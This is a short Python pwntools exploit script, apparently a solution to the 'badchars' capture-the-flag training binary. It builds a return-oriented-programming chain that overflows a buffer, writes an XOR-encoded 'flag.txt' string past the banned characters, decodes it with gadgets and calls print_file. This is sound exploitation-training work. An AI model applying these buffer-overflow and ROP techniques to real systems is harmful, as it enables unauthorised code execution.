#!/usr/bin/python3
from pwn import *

'''
badchars are: 'x', 'g', 'a', '.'
similar to the last challenge, we need to print the flag from flag.txt
badchars make up half of our string unfortunately
we will use xor 
xor by key 2: dnce,vzv == flag.txt
'''

# junk
junk = b"A"*40
flag_enc = p64(0x767a762c65636e64)
xor_key = p64(0x02)
print_file = p64(0x00400510)
target_addr = 0x00601048

# gadgets
## pops
pop_r12_r13_r14_r15 = p64(0x000000000040069c)
pop_r14_r15 = p64(0x00000000004006a0)
pop_rdi = p64(0x00000000004006a3)
## movs
mov_r13_r12 = p64(0x0000000000400634)
## xor
xor_r15_r14 = p64(0x0000000000400628)
## ret for stack alignment
ret = p64(0x00000000004004ee)

# payload
payload = junk                                  # 40 bytes of shit
payload += ret                                  # stack alignment
payload += pop_r12_r13_r14_r15                  # pop r12 r13 r14 r15
payload += flag_enc + p64(target_addr) + p64(777) + p64(777)
payload += mov_r13_r12                          # move flag into target addr

## xor function, loop through all 8 characters in flag_enc
for i in range(8):
    payload += pop_r14_r15
    payload += xor_key + p64(target_addr + i)
    payload += xor_r15_r14

## pop rdi, set target addr and call print_file
payload += pop_rdi
payload += p64(target_addr) + print_file             # print_file using target address

# process
context.binary = binary = ELF("./badchars", checksec=False)
p = process()
p.sendline(payload)
p.interactive()

## dumping payload to file for debugging
#f = open("./payload", "wb")
#f.write(payload)
#f.close()
